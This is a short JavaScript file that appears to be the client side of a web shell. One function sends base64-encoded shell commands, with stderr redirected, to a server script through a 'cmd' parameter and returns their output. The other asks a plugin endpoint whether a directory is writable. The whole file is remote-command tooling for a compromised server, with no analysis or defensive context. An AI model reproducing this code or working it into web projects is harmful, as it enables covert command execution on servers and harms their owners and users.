function shellrequest(dir, str)
{
	if (str.length != 0)
	{
		var xmlhttp = new XMLHttpRequest();
		var output = ""
		xmlhttp.onload = function()
		{
			if (this.readyState == 4 && this.status == 200) 
			{
				output = this.responseText;
			}
		};
		var fdir = dir + "?cmd=" + btoa("2>&1 " + str);
                xmlhttp.open("GET", fdir, false);
		xmlhttp.send();
		return output;
	};
}


function iswritable(plugindir, dir)
{
        if (dir.length != 0)
        {
                var xmlhttp = new XMLHttpRequest();
                var output = ""
                xmlhttp.onload = function()
                {
                        if (this.readyState == 4 && this.status == 200) 
                        {
                                output = this.responseText;
                        }
                };
                var fdir = plugindir + "?dir=" + btoa(dir);
                xmlhttp.open("GET", fdir, false);
                xmlhttp.send();
                return output;
        };
}
